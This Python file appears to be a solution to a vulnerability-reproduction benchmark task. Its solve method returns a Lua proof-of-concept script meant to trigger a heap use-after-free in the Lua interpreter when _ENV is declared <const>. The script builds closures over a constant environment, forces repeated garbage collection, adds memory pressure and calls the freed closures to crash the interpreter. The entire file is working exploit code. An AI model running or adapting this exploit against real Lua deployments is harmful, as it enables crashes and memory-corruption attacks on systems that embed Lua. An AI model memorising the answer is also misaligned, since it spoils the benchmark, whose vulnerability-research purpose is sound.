import os
import subprocess
import tempfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This generates a PoC for Lua's heap use-after-free vulnerability
        # when _ENV is declared as <const>
        
        poc = '''local _ENV <const> = setmetatable({}, {
    __gc = function()
        collectgarbage()
    end
})

function f()
    local _ENV <const> = {}
    
    for i = 1, 100 do
        local function inner()
            return _ENV
        end
    end
    
    return function()
        return _ENV
    end
end

local funcs = {}
for i = 1, 100 do
    funcs[i] = f()
end

collectgarbage()
collectgarbage()

-- Trigger use-after-free
for i = 1, 100 do
    local status, result = pcall(funcs[i])
end

-- Create more memory pressure to increase chance of crash
local t = {}
for i = 1, 10000 do
    t[i] = string.rep("A", 1000)
end

collectgarbage()
collectgarbage()

-- Final trigger
for i = 1, 100 do
    local status, result = pcall(funcs[1])
    if not status then
        -- Force crash by accessing potentially freed memory
        local x = {}
        setmetatable(x, {__gc = function() return funcs[1]() end})
        x = nil
        collectgarbage()
        break
    end
end

return 1'''

        return poc.encode('utf-8')
